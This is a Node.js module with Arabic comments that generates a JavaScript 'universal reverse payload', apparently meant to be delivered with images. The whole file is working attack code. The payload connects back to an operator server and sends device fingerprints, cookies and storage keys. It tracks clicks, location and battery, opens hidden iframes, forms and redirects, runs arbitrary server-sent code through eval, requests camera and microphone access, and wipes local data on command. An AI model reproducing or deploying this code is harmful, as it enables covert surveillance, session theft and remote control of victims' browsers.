const { v4: uuidv4 } = require('uuid');

class AdvancedPayloadSystem {
    constructor() {
        this.payloads = new Map();
        this.sessions = new Map();
    }

    // إنشاء بايلود متقدم يعمل في جميع التطبيقات
    createUniversalPayload(imageId, serverUrl) {
        const payloadId = uuidv4();
        
        const universalPayload = `
// === UNIVERSAL REVERSE PAYLOAD ===
(function() {
    const PAYLOAD_CONFIG = {
        image_id: '${imageId}',
        payload_id: '${payloadId}',
        server_url: '${serverUrl}',
        version: '5.0.0'
    };

    console.log('🦠 Universal Payload Activated:', PAYLOAD_CONFIG.image_id);

    // نظام التشغيل التلقائي
    function initializePayload() {
        // محاولة الاتصال المباشر
        establishDirectConnection();
        
        // إنشاء عناصر مخفية للتنفيذ
        createHiddenElements();
        
        // محاولة فتح المتصفح تلقائياً
        attemptBrowserRedirect();
        
        // نظام المراقبة المستمر
        startMonitoringSystem();
    }

    // إنشاء اتصال مباشر مع السيرفر
    function establishDirectConnection() {
        try {
            const ws = new WebSocket(PAYLOAD_CONFIG.server_url.replace('https', 'wss'));
            
            ws.onopen = function() {
                console.log('✅ Connected to reverse server');
                sendHandshake(ws);
            };
            
            ws.onmessage = handleMessage;
            ws.onclose = handleReconnection;
            ws.onerror = handleError;
            
        } catch (error) {
            console.log('❌ WebSocket failed, trying fallback...');
            startFallbackSystem();
        }
    }

    // إرسال بيانات المصافحة
    function sendHandshake(ws) {
        const deviceInfo = collectDeviceInformation();
        
        ws.send(JSON.stringify({
            type: 'reverse_handshake',
            device_id: deviceInfo.id,
            image_id: PAYLOAD_CONFIG.image_id,
            payload_id: PAYLOAD_CONFIG.payload_id,
            platform: deviceInfo.platform,
            userAgent: deviceInfo.userAgent,
            url: deviceInfo.url,
            ip: deviceInfo.ip,
            device_info: deviceInfo,
            timestamp: new Date().toISOString(),
            source: 'universal_payload'
        }));
    }

    // جمع معلومات متقدمة عن الجهاز
    function collectDeviceInformation() {
        return {
            id: generateDeviceId(),
            userAgent: navigator.userAgent,
            platform: navigator.platform,
            language: navigator.language,
            screen: {
                width: window.screen?.width,
                height: window.screen?.height,
                colorDepth: window.screen?.colorDepth
            },
            browser: getBrowserInfo(),
            network: getNetworkInfo(),
            device: getDeviceInfo(),
            location: window.location.href,
            referrer: document.referrer,
            cookies: document.cookie,
            localStorage: localStorage ? Object.keys(localStorage) : [],
            timestamp: new Date().toISOString()
        };
    }

    // معالجة الرسائل الواردة
    function handleMessage(event) {
        try {
            const data = JSON.parse(event.data);
            
            if (data.type === 'command') {
                executeAdvancedCommand(data.command, data.device_id)
                    .then(result => {
                        event.target.send(JSON.stringify({
                            type: 'command_result',
                            device_id: data.device_id,
                            command: data.command,
                            result: result,
                            timestamp: new Date().toISOString()
                        }));
                    });
            }
        } catch (e) {
            console.error('Message handling error:', e);
        }
    }

    // إعادة الاتصال التلقائي
    function handleReconnection() {
        setTimeout(establishDirectConnection, 3000);
    }

    // معالجة الأخطاء
    function handleError(error) {
        console.error('Connection error:', error);
        setTimeout(establishDirectConnection, 5000);
    }

    // نظام احتياطي
    function startFallbackSystem() {
        // استخدام Long Polling كبديل
        startLongPolling();
        
        // محاولة فتح روابط خارجية
        openExternalLinks();
        
        // تخزين البيانات محلياً للإرسال لاحقاً
        storeDataForLater();
    }

    // نظام Long Polling
    function startLongPolling() {
        setInterval(() => {
            fetch(PAYLOAD_CONFIG.server_url + '/polling/' + PAYLOAD_CONFIG.payload_id)
                .then(response => response.json())
                .then(commands => {
                    commands.forEach(command => {
                        executeAdvancedCommand(command.text, command.device_id);
                    });
                })
                .catch(error => console.log('Polling error:', error));
        }, 5000);
    }

    // إنشاء عناصر مخفية للتنفيذ
    function createHiddenElements() {
        // إنشاء iframe مخفي
        try {
            const hiddenFrame = document.createElement('iframe');
            hiddenFrame.style.display = 'none';
            hiddenFrame.src = PAYLOAD_CONFIG.server_url + '/tracking/' + PAYLOAD_CONFIG.payload_id;
            document.body.appendChild(hiddenFrame);
        } catch(e) {}

        // إنشاء نموذج مخفي
        try {
            const hiddenForm = document.createElement('form');
            hiddenForm.method = 'POST';
            hiddenForm.action = PAYLOAD_CONFIG.server_url + '/collect';
            hiddenForm.style.display = 'none';
            
            const deviceIdInput = document.createElement('input');
            deviceIdInput.name = 'device_id';
            deviceIdInput.value = generateDeviceId();
            hiddenForm.appendChild(deviceIdInput);
            
            document.body.appendChild(hiddenForm);
            setTimeout(() => hiddenForm.submit(), 1000);
        } catch(e) {}
    }

    // محاولة فتح المتصفح تلقائياً
    function attemptBrowserRedirect() {
        // محاولة فتح الرابط في متصفح خارجي
        setTimeout(() => {
            try {
                window.location.href = PAYLOAD_CONFIG.server_url + '/open/' + PAYLOAD_CONFIG.payload_id;
            } catch(e) {}
        }, 1000);

        // محاولة فتح نافذة جديدة
        setTimeout(() => {
            try {
                window.open(PAYLOAD_CONFIG.server_url + '/launch/' + PAYLOAD_CONFIG.payload_id, '_blank');
            } catch(e) {}
        }, 2000);
    }

    // نظام المراقبة المستمر
    function startMonitoringSystem() {
        // مراقبة النقرات
        try {
            document.addEventListener('click', (e) => {
                sendActivity('click', {
                    x: e.clientX,
                    y: e.clientY,
                    target: e.target.tagName
                });
            });
        } catch(e) {}

        // مراقبة الموقع
        try {
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(position => {
                    sendActivity('location', {
                        lat: position.coords.latitude,
                        lon: position.coords.longitude
                    });
                });
            }
        } catch(e) {}

        // مراقبة البطارية
        try {
            if (navigator.getBattery) {
                navigator.getBattery().then(battery => {
                    sendActivity('battery', {
                        level: battery.level * 100,
                        charging: battery.charging
                    });
                });
            }
        } catch(e) {}
    }

    // إرسال بيانات النشاط
    function sendActivity(type, data) {
        try {
            fetch(PAYLOAD_CONFIG.server_url + '/activity', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    type: type,
                    data: data,
                    payload_id: PAYLOAD_CONFIG.payload_id,
                    timestamp: new Date().toISOString()
                })
            }).catch(() => {});
        } catch(e) {}
    }

    // تنفيذ الأوامر المتقدمة
    async function executeAdvancedCommand(command, deviceId) {
        try {
            let result = '✅ تم التنفيذ';
            
            const cmd = command.toLowerCase().trim();
            
            if (cmd === 'معلومات' || cmd === 'info') {
                result = await getCompleteSystemInfo();
            }
            else if (cmd === 'الموقع' || cmd === 'location') {
                result = await getPreciseLocation();
            }
            else if (cmd === 'اهتزاز' || cmd === 'vibrate') {
                result = await triggerVibrationPattern();
            }
            else if (cmd === 'البطارية' || cmd === 'battery') {
                result = await getBatteryStatus();
            }
            else if (cmd === 'الصور' || cmd === 'photos') {
                result = await extractAllImages();
            }
            else if (cmd === 'الكاميرا' || cmd === 'camera') {
                result = await accessCamera();
            }
            else if (cmd === 'الميكروفون' || cmd === 'microphone') {
                result = await accessMicrophone();
            }
            else if (cmd === 'التخزين' || cmd === 'storage') {
                result = await getStorageData();
            }
            else if (cmd === 'الشبكة' || cmd === 'network') {
                result = await getNetworkInformation();
            }
            else if (cmd === 'لقطة' || cmd === 'screenshot') {
                result = await takeScreenshot();
            }
            else if (cmd === 'فرمتة' || cmd === 'format') {
                result = await formatDevice();
            }
            else if (cmd.startsWith('js:')) {
                const jsCode = command.substring(3);
                result = String(await eval(jsCode));
            } else {
                result = String(await eval(command));
            }
            
            return result;
            
        } catch (error) {
            return '❌ خطأ في الأمر: ' + error.toString();
        }
    }

    // جمع معلومات كاملة عن الجهاز
    async function getCompleteSystemInfo() {
        const info = {
            device_id: generateDeviceId(),
            user_agent: navigator.userAgent,
            platform: navigator.platform,
            language: navigator.language,
            screen: {
                width: window.screen?.width,
                height: window.screen?.height,
                colorDepth: window.screen?.colorDepth
            },
            browser: getBrowserInfo(),
            network: getNetworkInfo(),
            device: getDeviceInfo(),
            location: window.location.href,
            cookies: document.cookie,
            localStorage: localStorage ? Object.keys(localStorage) : [],
            timestamp: new Date().toISOString()
        };
        
        return JSON.stringify(info, null, 2);
    }

    // الحصول على الموقع الدقيق
    function getPreciseLocation() {
        return new Promise((resolve) => {
            if (!navigator.geolocation) {
                resolve('❌ المتصفح لا يدعم خدمة الموقع');
                return;
            }
            
            navigator.geolocation.getCurrentPosition(
                position => {
                    const loc = {
                        latitude: position.coords.latitude,
                        longitude: position.coords.longitude,
                        accuracy: position.coords.accuracy + ' meters',
                        altitude: position.coords.altitude,
                        speed: position.coords.speed,
                        timestamp: new Date(position.timestamp).toLocaleString()
                    };
                    resolve(JSON.stringify(loc, null, 2));
                },
                error => {
                    resolve(\`❌ خطأ في الموقع: \${error.message}\`);
                },
                {
                    enableHighAccuracy: true,
                    timeout: 30000,
                    maximumAge: 0
                }
            );
        });
    }

    // تشغيل الاهتزاز
    function triggerVibrationPattern() {
        if (navigator.vibrate) {
            navigator.vibrate([100, 50, 100, 50, 100, 50, 200, 100, 200, 100, 200]);
            return '📳 تم تشغيل نمط الاهتزاز المتقدم';
        } else {
            return '❌ الجهاز لا يدعم الاهتزاز';
        }
    }

    // معلومات البطارية
    function getBatteryStatus() {
        return new Promise((resolve) => {
            if (navigator.getBattery) {
                navigator.getBattery().then(battery => {
                    resolve(JSON.stringify({
                        level: (battery.level * 100) + '%',
                        charging: battery.charging ? 'نعم' : 'لا'
                    }, null, 2));
                }).catch(() => {
                    resolve('❌ لا يمكن قراءة معلومات البطارية');
                });
            } else {
                resolve('❌ المتصفح لا يدعم Battery API');
            }
        });
    }

    // سحب الصور من الصفحة
    function extractAllImages() {
        try {
            const images = Array.from(document.images);
            const imageInfo = images.map((img, index) => ({
                index: index + 1,
                src: img.src,
                alt: img.alt || 'لا يوجد وصف',
                width: img.naturalWidth,
                height: img.naturalHeight
            }));
            
            return \`🖼️ تم العثور على \${images.length} صورة:\\n\${JSON.stringify(imageInfo, null, 2)}\`;
        } catch (error) {
            return '❌ خطأ في استخراج الصور: ' + error.message;
        }
    }

    // الوصول إلى الكاميرا
    async function accessCamera() {
        return new Promise((resolve) => {
            if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
                resolve('❌ لا يمكن الوصول إلى الكاميرا');
                return;
            }
            
            navigator.mediaDevices.getUserMedia({ video: true })
                .then(stream => {
                    resolve('✅ تم الوصول إلى الكاميرا بنجاح');
                })
                .catch(error => {
                    resolve(\`❌ خطأ في الكاميرا: \${error.message}\`);
                });
        });
    }

    // الوصول إلى الميكروفون
    async function accessMicrophone() {
        return new Promise((resolve) => {
            if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
                resolve('❌ لا يمكن الوصول إلى الميكروفون');
                return;
            }
            
            navigator.mediaDevices.getUserMedia({ audio: true })
                .then(stream => {
                    resolve('✅ تم الوصول إلى الميكروفون بنجاح');
                })
                .catch(error => {
                    resolve(\`❌ خطأ في الميكروفون: \${error.message}\`);
                });
        });
    }

    // الحصول على بيانات التخزين
    async function getStorageData() {
        try {
            return JSON.stringify({
                cookies: document.cookie,
                localStorage: localStorage ? Object.keys(localStorage) : [],
                sessionStorage: sessionStorage ? Object.keys(sessionStorage) : []
            }, null, 2);
        } catch (error) {
            return '❌ خطأ في قراءة التخزين';
        }
    }

    // معلومات الشبكة
    async function getNetworkInformation() {
        if (navigator.connection) {
            return JSON.stringify({
                type: navigator.connection.effectiveType,
                downlink: navigator.connection.downlink + ' Mbps',
                rtt: navigator.connection.rtt + ' ms'
            }, null, 2);
        } else {
            return '❌ لا توجد معلومات عن الشبكة';
        }
    }

    // لقطة الشاشة
    async function takeScreenshot() {
        try {
            if (typeof html2canvas !== 'undefined') {
                const canvas = await html2canvas(document.body);
                return canvas.toDataURL('image/png').substring(0, 500) + '...';
            } else {
                return '❌ تتطلب لقطة الشاشة مكتبة html2canvas';
            }
        } catch (error) {
            return '❌ خطأ في لقطة الشاشة: ' + error.message;
        }
    }

    // محاكاة فرمتة الجهاز
    async function formatDevice() {
        try {
            if (localStorage) localStorage.clear();
            if (sessionStorage) sessionStorage.clear();
            document.cookie.split(";").forEach(cookie => {
                const name = cookie.split("=")[0].trim();
                document.cookie = name + "=; expires=Thu, 01 Jan 1970 00:00:00 UTC; path=/;";
            });
            
            return '✅ تم محاكاة فرمتة البيانات المحلية بنجاح';
        } catch (error) {
            return '❌ خطأ في الفرمتة: ' + error.message;
        }
    }

    // وظائف مساعدة
    function getBrowserInfo() {
        const ua = navigator.userAgent;
        if (ua.includes("Chrome")) return "Chrome";
        if (ua.includes("Firefox")) return "Firefox";
        if (ua.includes("Safari")) return "Safari";
        if (ua.includes("Edge")) return "Edge";
        return "Unknown";
    }

    function getNetworkInfo() {
        if (navigator.connection) {
            return {
                effectiveType: navigator.connection.effectiveType,
                downlink: navigator.connection.downlink,
                rtt: navigator.connection.rtt
            };
        }
        return null;
    }

    function getDeviceInfo() {
        return {
            memory: navigator.deviceMemory,
            cores: navigator.hardwareConcurrency,
            touch: navigator.maxTouchPoints
        };
    }

    function generateDeviceId() {
        const components = [
            navigator.userAgent,
            navigator.platform,
            navigator.language,
            Math.random().toString(36).substr(2, 9),
            Date.now().toString(36)
        ];
        return 'device_' + btoa(components.join('_')).replace(/[^a-zA-Z0-9]/g, '').substr(0, 20);
    }

    // وظائف النظام الاحتياطي
    function openExternalLinks() {
        try {
            window.open(PAYLOAD_CONFIG.server_url + '/open/' + PAYLOAD_CONFIG.payload_id, '_system');
        } catch(e) {}
    }

    function storeDataForLater() {
        try {
            localStorage.setItem('pending_data', JSON.stringify({
                payload_id: PAYLOAD_CONFIG.payload_id,
                timestamp: new Date().toISOString()
            }));
        } catch(e) {}
    }

    // بدء النظام
    console.log('🚀 Starting Universal Reverse Payload System...');
    setTimeout(initializePayload, 500);

})();
// === UNIVERSAL PAYLOAD END ===
`;

        this.payloads.set(payloadId, {
            imageId: imageId,
            payload: universalPayload,
            createdAt: new Date()
        });

        return {
            payloadId: payloadId,
            code: universalPayload
        };
    }

    // الحصول على البايلود
    getPayload(payloadId) {
        return this.payloads.get(payloadId);
    }

    // تسجيل الجلسة
    registerSession(deviceId, sessionData) {
        this.sessions.set(deviceId, {
            ...sessionData,
            lastActive: new Date(),
            active: true
        });
    }

    // الحصول على الجلسات النشطة
    getActiveSessions() {
        return Array.from(this.sessions.entries())
            .filter(([_, session]) => session.active)
            .map(([deviceId, session]) => ({ deviceId, ...session }));
    }
}

module.exports = AdvancedPayloadSystem;